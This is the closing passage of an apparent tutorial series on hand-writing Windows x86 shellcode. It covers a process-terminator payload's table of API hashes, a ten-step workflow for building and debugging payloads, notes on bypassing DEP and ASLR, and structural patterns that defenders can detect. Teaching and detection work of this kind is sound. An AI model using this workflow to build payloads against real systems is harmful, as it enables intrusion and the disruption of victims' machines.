    <linearGradient id="line_s53" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="260" rx="10" fill="url(#bg_s53)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s53)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold" filter="url(#glow_s53)">EBP Variable Table: Process Terminator</text>
  <!-- Table header -->
  <rect x="60" y="50" width="120" height="30" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.2"/>
  <text x="120" y="70" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">Offset</text>
  <rect x="185" y="50" width="260" height="30" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="315" y="70" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">Function</text>
  <rect x="450" y="50" width="240" height="30" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="570" y="70" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">Hash</text>
  <!-- Rows -->
  <text x="120" y="105" text-anchor="middle" fill="#00ff88" font-size="11">[ebp+0x04]</text>
  <text x="315" y="105" text-anchor="middle" fill="#e0e7ff" font-size="11">find_function address</text>
  <text x="570" y="105" text-anchor="middle" fill="#8b949e" font-size="11">(internal)</text>
  <text x="120" y="128" text-anchor="middle" fill="#00ff88" font-size="11">[ebp+0x10]</text>
  <text x="315" y="128" text-anchor="middle" fill="#e0e7ff" font-size="11">TerminateProcess</text>
  <text x="570" y="128" text-anchor="middle" fill="#ff6b35" font-size="11">0x78b5b983</text>
  <text x="120" y="151" text-anchor="middle" fill="#00ff88" font-size="11">[ebp+0x14]</text>
  <text x="315" y="151" text-anchor="middle" fill="#e0e7ff" font-size="11">CreateToolhelp32Snapshot</text>
  <text x="570" y="151" text-anchor="middle" fill="#ff6b35" font-size="11">0xe454dfed</text>
  <text x="120" y="174" text-anchor="middle" fill="#00ff88" font-size="11">[ebp+0x18]</text>
  <text x="315" y="174" text-anchor="middle" fill="#e0e7ff" font-size="11">Process32First</text>
  <text x="570" y="174" text-anchor="middle" fill="#ff6b35" font-size="11">0x3249baa7</text>
  <text x="120" y="197" text-anchor="middle" fill="#00ff88" font-size="11">[ebp+0x1C]</text>
  <text x="315" y="197" text-anchor="middle" fill="#e0e7ff" font-size="11">Process32Next</text>
  <text x="570" y="197" text-anchor="middle" fill="#ff6b35" font-size="11">0x4776654a</text>
  <text x="120" y="220" text-anchor="middle" fill="#00ff88" font-size="11">[ebp+0x20]</text>
  <text x="315" y="220" text-anchor="middle" fill="#e0e7ff" font-size="11">OpenProcess</text>
  <text x="570" y="220" text-anchor="middle" fill="#ff6b35" font-size="11">0xefe297c0</text>
  <text x="120" y="243" text-anchor="middle" fill="#00ff88" font-size="11">[ebp+0x24]</text>
  <text x="315" y="243" text-anchor="middle" fill="#e0e7ff" font-size="11">CloseHandle</text>
  <text x="570" y="243" text-anchor="middle" fill="#ff6b35" font-size="11">0x0ffd97fb</text>
</svg></div>

*Figure 20.3 - The EBP variable table for the process terminator. Six kernel32 APIs resolved via find_function, plus the snapshot handle at [ebp+0x2C] and the target string pointer at [ebp+0x30].*

> This shellcode uses the exact same skeleton -- PEB walk, find_function, hash-based resolution -- as every other payload in this series. The only new concept is the Toolhelp32 enumeration loop. Once you understand the pattern, adapting it to kill a different process is just changing the target string.

### PoC Video

The following video demonstrates the process terminator shellcode finding and killing notepad.exe in action:

<div align="center">
  <video width="720" controls>
    <source src="/assets/video/shellcoding/process-terminator-poc.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>

*Video: Process terminator killing notepad.exe*

---

## 21. The Complete Development Workflow

Here is the end-to-end recipe for building any new shellcode payload from scratch.

**Step 1 -- Identify Required APIs.** Write the high-level logic in C pseudocode. List every Windows API and its DLL.

**Step 2 -- Compute ROR-13 Hashes.** Run each API name through the hash script. Double-check each hash.

**Step 3 -- Write the Skeleton.** Copy the reusable skeleton: `mov ebp, esp` / `add esp, 0xfffff9f0` / PEB walk / find_function.

**Step 4 -- Resolve APIs.** Push hash, call find_function, store at `[ebp+N]`. Keep a comment table mapping offsets to names.

**Step 5 -- Load Additional DLLs.** Call `LoadLibraryA`, swap base into EBX, resolve exports from the new DLL.

**Step 6 -- Build Payload Logic.** Construct strings and structs on the stack, push arguments right-to-left, call function pointers.

**Step 7 -- Eliminate Bad Characters.** Audit assembled bytes. Apply encoding patterns from Section 5.

**Step 8 -- Assemble and Test.** Keystone to assemble, bad char scanner to verify, ctypes harness to execute.

**Step 9 -- Debug in WinDbg.** Place `int3`, attach WinDbg, single-step, verify register values and stack layout.

**Step 10 -- Iterate.** Fix, reassemble, retest. Each cycle gets faster as your pattern library grows.

<div align="center"><svg viewBox="0 0 750 440" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
<defs>
  <marker id="ah20" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
  <marker id="ah20d" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00d4ff"/></marker>
</defs>
<rect width="750" height="440" rx="8" fill="#0a0e17"/>
<text x="375" y="28" fill="#e0e7ff" font-size="15" text-anchor="middle" font-weight="bold">Shellcode Development Pipeline</text>
<!-- Row 1 -->
<rect x="30" y="50" width="140" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
<text x="100" y="72" fill="#00d4ff" font-size="11" text-anchor="middle" font-weight="bold">1. Identify APIs</text>
<text x="100" y="92" fill="#e0e7ff" font-size="9" text-anchor="middle">C pseudocode first</text>
<line x1="170" y1="77" x2="195" y2="77" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah20)"/>
<rect x="200" y="50" width="140" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
<text x="270" y="72" fill="#00d4ff" font-size="11" text-anchor="middle" font-weight="bold">2. Hash Names</text>
<text x="270" y="92" fill="#e0e7ff" font-size="9" text-anchor="middle">ROR-13 script</text>
<line x1="340" y1="77" x2="365" y2="77" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah20)"/>
<rect x="370" y="50" width="150" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
<text x="445" y="72" fill="#00d4ff" font-size="11" text-anchor="middle" font-weight="bold">3. Skeleton</text>
<text x="445" y="92" fill="#e0e7ff" font-size="9" text-anchor="middle">EBP + stack + PEB</text>
<line x1="520" y1="77" x2="545" y2="77" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah20)"/>
<rect x="550" y="50" width="170" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
<text x="635" y="72" fill="#00d4ff" font-size="11" text-anchor="middle" font-weight="bold">4. Resolve APIs</text>
<text x="635" y="92" fill="#e0e7ff" font-size="9" text-anchor="middle">push hash, call, store</text>
<!-- Row 2 -->
<line x1="635" y1="105" x2="635" y2="130" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah20)"/>
<rect x="550" y="135" width="170" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
<text x="635" y="157" fill="#00d4ff" font-size="11" text-anchor="middle" font-weight="bold">5. Load DLLs</text>
<text x="635" y="177" fill="#e0e7ff" font-size="9" text-anchor="middle">LoadLibraryA + resolve</text>
<line x1="550" y1="162" x2="505" y2="162" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah20)"/>
<rect x="340" y="135" width="160" height="55" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
<text x="420" y="157" fill="#ff3366" font-size="11" text-anchor="middle" font-weight="bold">6. Payload Logic</text>
<text x="420" y="177" fill="#e0e7ff" font-size="9" text-anchor="middle">Strings, structs, calls</text>
<line x1="340" y1="162" x2="295" y2="162" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah20)"/>
<rect x="130" y="135" width="160" height="55" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
<text x="210" y="157" fill="#ff6b35" font-size="11" text-anchor="middle" font-weight="bold">7. Kill Bad Chars</text>
<text x="210" y="177" fill="#e0e7ff" font-size="9" text-anchor="middle">XOR/NOT/SHL/NEG</text>
<!-- Row 3 -->
<line x1="210" y1="190" x2="210" y2="220" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah20)"/>
<rect x="130" y="225" width="160" height="55" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
<text x="210" y="247" fill="#00ff88" font-size="11" text-anchor="middle" font-weight="bold">8. Assemble + Test</text>
<text x="210" y="267" fill="#e0e7ff" font-size="9" text-anchor="middle">Keystone + ctypes</text>
<line x1="290" y1="252" x2="350" y2="252" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah20)"/>
<rect x="355" y="225" width="160" height="55" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
<text x="435" y="247" fill="#00ff88" font-size="11" text-anchor="middle" font-weight="bold">9. Debug</text>
<text x="435" y="267" fill="#e0e7ff" font-size="9" text-anchor="middle">WinDbg + int3</text>
<line x1="515" y1="252" x2="575" y2="252" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ah20)"/>
<rect x="580" y="225" width="140" height="55" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
<text x="650" y="247" fill="#ff3366" font-size="11" text-anchor="middle" font-weight="bold">10. Iterate</text>
<text x="650" y="267" fill="#e0e7ff" font-size="9" text-anchor="middle">Fix + retest</text>
<!-- Loop arrow from 10 back to 7 -->
<path d="M 650,280 C 650,330 210,330 210,225" fill="none" stroke="#00d4ff" stroke-width="2" stroke-dasharray="8,4" marker-end="url(#ah20d)"/>
<text x="430" y="325" fill="#00d4ff" font-size="10" text-anchor="middle">Iterate until clean</text>
<!-- Bottom note -->
<rect x="150" y="370" width="450" height="50" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
<text x="375" y="392" fill="#e0e7ff" font-size="11" text-anchor="middle">Each cycle takes under a minute once the tooling is set up.</text>
<text x="375" y="410" fill="#00ff88" font-size="10" text-anchor="middle">Build a library of tested blocks to accelerate new payloads.</text>
</svg></div>

*Figure 21.1 - The 10-step shellcode development pipeline. Steps 7-10 form an inner loop that repeats until all bad characters are eliminated and the payload works correctly.*

<div align="center"><svg viewBox="0 0 750 310" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <marker id="ta20" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
    <marker id="tb20" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00d4ff"/></marker>
    <marker id="tc20" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#ff6b35"/></marker>
  </defs>
  <rect width="750" height="310" rx="10" fill="#0a0e17"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Shellcode Development Tooling Ecosystem</text>
  <!-- Center: shellcode.asm -->
  <rect x="280" y="100" width="190" height="75" rx="8" fill="#151b28" stroke="#ff3366" stroke-width="2.5"/>
  <text x="375" y="125" text-anchor="middle" fill="#ff3366" font-size="13" font-weight="bold">shellcode.asm</text>
  <text x="375" y="145" text-anchor="middle" fill="#e0e7ff" font-size="10">Your x86 assembly payload</text>
  <text x="375" y="162" text-anchor="middle" fill="#8b949e" font-size="9">The single source of truth</text>
  <!-- Left: Python tools -->
  <rect x="20" y="45" width="210" height="185" rx="8" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="125" y="70" text-anchor="middle" fill="#00d4ff" font-size="13" font-weight="bold">Python Toolchain</text>
  <line x1="40" y1="80" x2="210" y2="80" stroke="#8b949e" stroke-width="0.5"/>
  <text x="40" y="100" fill="#00ff88" font-size="10">Keystone</text><text x="130" y="100" fill="#8b949e" font-size="9">assembler</text>
  <text x="40" y="120" fill="#00ff88" font-size="10">hash.py</text><text x="130" y="120" fill="#8b949e" font-size="9">ROR-13 hashes</text>
  <text x="40" y="140" fill="#00ff88" font-size="10">ctypes</text><text x="130" y="140" fill="#8b949e" font-size="9">test harness</text>
  <text x="40" y="160" fill="#00ff88" font-size="10">badchar.py</text><text x="130" y="160" fill="#8b949e" font-size="9">byte scanner</text>
  <text x="40" y="180" fill="#00ff88" font-size="10">struct</text><text x="130" y="180" fill="#8b949e" font-size="9">pack helpers</text>
  <rect x="40" y="195" width="170" height="22" rx="5" fill="#0d1117" stroke="#00d4ff" stroke-width="1"/>
  <text x="125" y="211" text-anchor="middle" fill="#00d4ff" font-size="9">Assemble -> Scan -> Inject</text>
  <!-- Right: WinDbg -->
  <rect x="520" y="55" width="210" height="160" rx="8" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
  <text x="625" y="80" text-anchor="middle" fill="#ff6b35" font-size="13" font-weight="bold">WinDbg</text>
  <line x1="540" y1="90" x2="710" y2="90" stroke="#8b949e" stroke-width="0.5"/>
  <text x="540" y="110" fill="#e0e7ff" font-size="10">int3 breakpoints</text>
  <text x="540" y="130" fill="#e0e7ff" font-size="10">Register inspection</text>
  <text x="540" y="150" fill="#e0e7ff" font-size="10">Stack layout view</text>
  <text x="540" y="170" fill="#e0e7ff" font-size="10">Memory dumps</text>
  <text x="540" y="190" fill="#e0e7ff" font-size="10">Single-step execution</text>
  <!-- Arrows: ASM -> Python (assemble) -->
  <line x1="280" y1="125" x2="235" y2="100" stroke="#00d4ff" stroke-width="1.5" marker-end="url(#tb20)"/>
  <text x="245" y="98" fill="#00d4ff" font-size="8">assemble</text>
  <!-- Arrow: Python -> center (bytes) -->
  <line x1="230" y1="145" x2="278" y2="140" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ta20)"/>
  <text x="245" y="155" fill="#00ff88" font-size="8">bytes</text>
  <!-- Arrow: center -> WinDbg (inject + debug) -->
  <line x1="470" y1="125" x2="518" y2="105" stroke="#ff6b35" stroke-width="1.5" marker-end="url(#tc20)"/>
  <text x="498" y="100" fill="#ff6b35" font-size="8">inject</text>
  <!-- Arrow: WinDbg -> center (fix) -->
  <line x1="520" y1="155" x2="472" y2="150" stroke="#ff3366" stroke-width="1.5" stroke-dasharray="6,3"/>
  <text x="498" y="165" fill="#ff3366" font-size="8">fix bugs</text>
  <!-- Bottom: output -->
  <rect x="200" y="250" width="350" height="40" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="375" y="268" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">Final: shellcode.bin (clean, tested, null-free)</text>
  <text x="375" y="283" text-anchor="middle" fill="#8b949e" font-size="9">Ready for exploit payload delivery</text>
  <!-- Arrow down -->
  <line x1="375" y1="175" x2="375" y2="248" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ta20)"/>
</svg></div>

*Figure 21.2 - The tooling ecosystem: Python scripts handle assembly and byte scanning, WinDbg handles runtime debugging, and the cycle repeats until the payload is clean.*

> **Pro tip:** Keep a personal library of tested building blocks: `find_kernel32`, `find_function`, string-push sequences for common DLL names, and the ctypes test harness. New payloads become an assembly job rather than a greenfield project.

---

## 22. Mitigations, Ethics, and Closing Thoughts

### Modern Defenses That Impact Shellcode

Each layer adds a barrier that shellcode must defeat. Understanding these helps both attackers (for authorized testing) and defenders (for building detections).

<div align="center"><svg viewBox="0 0 750 360" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
<rect width="750" height="360" rx="8" fill="#0a0e17"/>
<text x="375" y="28" fill="#e0e7ff" font-size="15" text-anchor="middle" font-weight="bold">Defense-in-Depth: Shellcode Mitigation Layers</text>
<!-- Layer 4 - CET (outermost) -->
<rect x="60" y="50" width="630" height="280" rx="10" fill="none" stroke="#ff3366" stroke-width="2.5"/>
<text x="375" y="72" fill="#ff3366" font-size="13" text-anchor="middle" font-weight="bold">CET (Control-flow Enforcement Technology)</text>
<text x="375" y="88" fill="#8b949e" font-size="10" text-anchor="middle">Hardware shadow stack catches return-address overwrites</text>
<!-- Layer 3 - CFG -->
<rect x="100" y="98" width="550" height="218" rx="8" fill="none" stroke="#ff6b35" stroke-width="2"/>
<text x="375" y="118" fill="#ff6b35" font-size="13" text-anchor="middle" font-weight="bold">CFG (Control Flow Guard)</text>
<text x="375" y="134" fill="#8b949e" font-size="10" text-anchor="middle">Validates indirect call targets against a legitimate-function bitmap</text>
<!-- Layer 2 - ASLR -->
<rect x="140" y="145" width="470" height="155" rx="7" fill="none" stroke="#00ff88" stroke-width="2"/>
<text x="375" y="165" fill="#00ff88" font-size="13" text-anchor="middle" font-weight="bold">ASLR (Address Space Layout Randomization)</text>
<text x="375" y="181" fill="#8b949e" font-size="10" text-anchor="middle">Randomizes DLL base addresses -- PEB walk bypasses, but initial redirect must adapt</text>
<!-- Layer 1 - DEP (innermost) -->
<rect x="180" y="192" width="390" height="90" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2.5"/>
<text x="375" y="218" fill="#00d4ff" font-size="14" text-anchor="middle" font-weight="bold">DEP (Data Execution Prevention)</text>
<text x="375" y="238" fill="#e0e7ff" font-size="10" text-anchor="middle">Stack/heap marked NX -- need ROP chain to</text>
<text x="375" y="254" fill="#e0e7ff" font-size="10" text-anchor="middle">VirtualProtect or VirtualAlloc(RWX) first</text>
<text x="375" y="275" fill="#ff3366" font-size="11" text-anchor="middle" font-weight="bold">Shellcode runs HERE (if all layers bypassed)</text>
<!-- Bottom note -->
<text x="375" y="345" fill="#e0e7ff" font-size="11" text-anchor="middle">Each layer must be bypassed independently -- defense stacking raises the bar exponentially</text>
</svg></div>

*Figure 22.1 - Modern defenses form concentric barriers. DEP is the innermost (most common to bypass via ROP), while CET is the newest hardware-level defense.*

**DEP (Data Execution Prevention)** marks stack and heap memory as non-executable. Attackers must first use ROP to call `VirtualProtect` or `VirtualAlloc` to mark memory executable.

**ASLR (Address Space Layout Randomization)** randomizes DLL base addresses. Our PEB walk still works because it resolves at runtime, but the exploit's initial redirect (e.g., `jmp esp`) must defeat ASLR through an information leak or non-ASLR module.

**CFG (Control Flow Guard)** validates indirect call targets against a bitmap of legitimate function entry points.

**CET (Control-flow Enforcement Technology)** is Intel's hardware-level defense with a shadow stack that catches return address overwrites.

### Why This Matters for Defenders

When you see a suspicious memory region in a forensic dump, you can recognize the PEB walk pattern. When an EDR flags `VirtualAlloc` with RWX permissions, you understand why that is suspicious. When you write detection signatures, you can target structural patterns -- `fs:[0x30]`, the `ror edx, 0x0d` loop, `rep stosb` zero-fill -- rather than relying on fragile byte signatures.

Understanding the attacker's craft makes you a better defender. Full stop.

<div align="center"><svg viewBox="0 0 750 330" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <rect width="750" height="330" rx="10" fill="#0a0e17"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Structural Patterns for Detection</text>
  <text x="375" y="48" text-anchor="middle" fill="#8b949e" font-size="10">Shellcode fingerprints that defenders can target in signatures and memory scans</text>
  <!-- Pattern 1: PEB access -->
  <rect x="30" y="65" width="215" height="70" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="137" y="85" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">PEB Access</text>
  <text x="137" y="103" text-anchor="middle" fill="#e0e7ff" font-size="10">mov eax, fs:[0x30]</text>
  <text x="137" y="123" text-anchor="middle" fill="#8b949e" font-size="9">TEB -> PEB traversal</text>
  <!-- Pattern 2: ROR hash loop -->
  <rect x="268" y="65" width="215" height="70" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
  <text x="375" y="85" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">Hash Loop</text>
  <text x="375" y="103" text-anchor="middle" fill="#e0e7ff" font-size="10">ror edx, 0x0d; add edx, eax</text>
  <text x="375" y="123" text-anchor="middle" fill="#8b949e" font-size="9">ROR-13 function name hashing</text>
  <!-- Pattern 3: VirtualAlloc RWX -->
  <rect x="506" y="65" width="215" height="70" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="613" y="85" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">RWX Allocation</text>
  <text x="613" y="103" text-anchor="middle" fill="#e0e7ff" font-size="10">VirtualAlloc(0x40)</text>
  <text x="613" y="123" text-anchor="middle" fill="#8b949e" font-size="9">PAGE_EXECUTE_READWRITE</text>
  <!-- Arrow connectors (detection chain) -->
  <line x1="137" y1="135" x2="137" y2="155" stroke="#ff3366" stroke-width="1.5"/>
  <line x1="375" y1="135" x2="375" y2="155" stroke="#ff6b35" stroke-width="1.5"/>
  <line x1="613" y1="135" x2="613" y2="155" stroke="#00d4ff" stroke-width="1.5"/>
  <!-- Timeline bar -->
  <rect x="30" y="155" width="690" height="4" rx="2" fill="#8b949e" opacity="0.5"/>
  <circle cx="137" cy="157" r="5" fill="#ff3366"/><circle cx="375" cy="157" r="5" fill="#ff6b35"/><circle cx="613" cy="157" r="5" fill="#00d4ff"/>
  <text x="137" y="178" text-anchor="middle" fill="#ff3366" font-size="9">Stage 1: Locate</text>
  <text x="375" y="178" text-anchor="middle" fill="#ff6b35" font-size="9">Stage 2: Resolve</text>
  <text x="613" y="178" text-anchor="middle" fill="#00d4ff" font-size="9">Stage 3: Execute</text>
  <!-- Pattern 4: API resolution -->
  <rect x="30" y="195" width="215" height="70" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="137" y="215" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">API Resolution</text>
  <text x="137" y="233" text-anchor="middle" fill="#e0e7ff" font-size="10">push hash; call find_func</text>
  <text x="137" y="253" text-anchor="middle" fill="#8b949e" font-size="9">Hash-based export lookup</text>
  <!-- Pattern 5: Zero-fill -->
  <rect x="268" y="195" width="215" height="70" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="375" y="215" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">Zero-Fill</text>
  <text x="375" y="233" text-anchor="middle" fill="#e0e7ff" font-size="10">xor eax,eax; rep stosb</text>
  <text x="375" y="253" text-anchor="middle" fill="#8b949e" font-size="9">Struct initialization pattern</text>
  <!-- Pattern 6: Stack strings -->
  <rect x="506" y="195" width="215" height="70" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="613" y="215" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">Stack Strings</text>
  <text x="613" y="233" text-anchor="middle" fill="#e0e7ff" font-size="10">push 0x2e646d63</text>
  <text x="613" y="253" text-anchor="middle" fill="#8b949e" font-size="9">Runtime string construction</text>
  <!-- Bottom summary -->
  <rect x="80" y="282" width="590" height="32" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="375" y="303" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">Target structural patterns, not fragile byte signatures -- shellcode mutates, structure persists</text>
</svg></div>

*Figure 22.2 - Structural detection patterns. These code patterns appear in virtually all PEB-walking shellcode and are far more reliable detection targets than specific byte sequences.*

### Final Reflection

Shellcode is not magic. It is careful, patient engineering: finding a DLL by walking linked lists, matching function names by computing hashes, building data structures one DWORD at a time, and calling the same Windows APIs that every normal program uses -- just without the luxury of a compiler, a linker, or an import table.

The machine does not care whether instructions come from a `.exe` on disk or from a buffer in memory. It executes what it is told.

---

---

## About the Author

### Certifications

<div align="center"><svg viewBox="0 0 750 210" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Arial, sans-serif;">
  <defs>
    <linearGradient id="cbg" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <linearGradient id="bdg-b" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#1e3a5f"/><stop offset="100%" stop-color="#0f2340"/></linearGradient>
    <linearGradient id="bdg-r" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#5f1e2e"/><stop offset="100%" stop-color="#3f0f1a"/></linearGradient>
    <linearGradient id="bdg-g" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#1e5f3a"/><stop offset="100%" stop-color="#0f3f20"/></linearGradient>
  </defs>
  <rect width="750" height="210" rx="10" fill="url(#cbg)"/>
  <!-- Row 1 -->
  <rect x="15" y="15" width="118" height="50" rx="8" fill="url(#bdg-r)" stroke="#ff3366" stroke-width="1.5"/>
  <text x="74" y="36" text-anchor="middle" fill="#ff3366" font-size="15" font-weight="bold">CWEE</text>
  <text x="74" y="54" text-anchor="middle" fill="#8b949e" font-size="7">Web Exploitation Expert</text>
  <rect x="143" y="15" width="118" height="50" rx="8" fill="url(#bdg-b)" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="202" y="36" text-anchor="middle" fill="#00d4ff" font-size="15" font-weight="bold">CPTS</text>
  <text x="202" y="54" text-anchor="middle" fill="#8b949e" font-size="7">Penetration Testing Specialist</text>
  <rect x="271" y="15" width="118" height="50" rx="8" fill="url(#bdg-r)" stroke="#ff3366" stroke-width="1.5"/>
  <text x="330" y="36" text-anchor="middle" fill="#ff3366" font-size="15" font-weight="bold">CWES</text>
  <text x="330" y="54" text-anchor="middle" fill="#8b949e" font-size="7">Web Exploitation Specialist</text>
  <rect x="399" y="15" width="118" height="50" rx="8" fill="url(#bdg-g)" stroke="#00ff88" stroke-width="1.5"/>
  <text x="458" y="36" text-anchor="middle" fill="#00ff88" font-size="15" font-weight="bold">CJCA</text>
  <text x="458" y="54" text-anchor="middle" fill="#8b949e" font-size="7">Junior Cybersecurity Analyst</text>
  <rect x="527" y="15" width="100" height="50" rx="8" fill="url(#bdg-r)" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="577" y="36" text-anchor="middle" fill="#ff6b35" font-size="15" font-weight="bold">CRTM</text>
  <text x="577" y="54" text-anchor="middle" fill="#8b949e" font-size="7">Red Team Member</text>
  <rect x="637" y="15" width="100" height="50" rx="8" fill="url(#bdg-r)" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="687" y="36" text-anchor="middle" fill="#ff6b35" font-size="15" font-weight="bold">CRTE</text>
  <text x="687" y="54" text-anchor="middle" fill="#8b949e" font-size="7">Red Team Expert</text>
  <!-- Row 2 -->
  <rect x="15" y="78" width="118" height="50" rx="8" fill="url(#bdg-b)" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="74" y="99" text-anchor="middle" fill="#00d4ff" font-size="15" font-weight="bold">CRTP</text>
  <text x="74" y="117" text-anchor="middle" fill="#8b949e" font-size="7">Red Team Professional</text>
  <rect x="143" y="78" width="118" height="50" rx="8" fill="url(#bdg-r)" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="202" y="99" text-anchor="middle" fill="#ff6b35" font-size="15" font-weight="bold">CRTO</text>
  <text x="202" y="117" text-anchor="middle" fill="#8b949e" font-size="7">Red Team Operator</text>
  <rect x="271" y="78" width="118" height="50" rx="8" fill="url(#bdg-b)" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="330" y="99" text-anchor="middle" fill="#00d4ff" font-size="15" font-weight="bold">eWPTX</text>
  <text x="330" y="117" text-anchor="middle" fill="#8b949e" font-size="7">Web Pentester eXtreme</text>
  <rect x="399" y="78" width="118" height="50" rx="8" fill="url(#bdg-g)" stroke="#00ff88" stroke-width="1.5"/>
  <text x="458" y="99" text-anchor="middle" fill="#00ff88" font-size="15" font-weight="bold">eCPPT</text>
  <text x="458" y="117" text-anchor="middle" fill="#8b949e" font-size="7">Professional Pentester</text>
  <rect x="527" y="78" width="210" height="50" rx="8" fill="url(#bdg-b)" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="632" y="99" text-anchor="middle" fill="#00d4ff" font-size="15" font-weight="bold">eMAPT</text>
  <text x="632" y="117" text-anchor="middle" fill="#8b949e" font-size="7">Mobile Application Pentester</text>
  <!-- Divider -->
  <rect x="100" y="145" width="550" height="1" rx="1" fill="#1e3a5f" opacity="0.5"/>
  <!-- Attribution -->
  <text x="375" y="175" text-anchor="middle" fill="#e0e7ff" font-size="14">SadlyRemo</text>
  <text x="375" y="198" text-anchor="middle" fill="#8b949e" font-size="10">Reverse Engineering and Exploit Development</text>
</svg></div>

<div align="center"><svg viewBox="0 0 750 100" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Arial, sans-serif;">
  <defs>
    <linearGradient id="gline" x1="0" y1="0" x2="1" y2="0">
      <stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/>
      <stop offset="50%" stop-color="#00ff88" stop-opacity="0.8"/>
      <stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/>
    </linearGradient>
  </defs>
  <rect width="750" height="100" rx="10" fill="#0a0e17"/>
  <rect x="75" y="15" width="600" height="1" fill="url(#gline)"/>
  <text x="375" y="52" text-anchor="middle" fill="#00ff88" font-size="18" font-weight="bold">Go build something the CPU has never seen before.</text>
  <rect x="75" y="72" width="600" height="1" fill="url(#gline)"/>
  <text x="375" y="93" text-anchor="middle" fill="#4a5568" font-size="11">The machine is waiting.</text>
</svg></div>
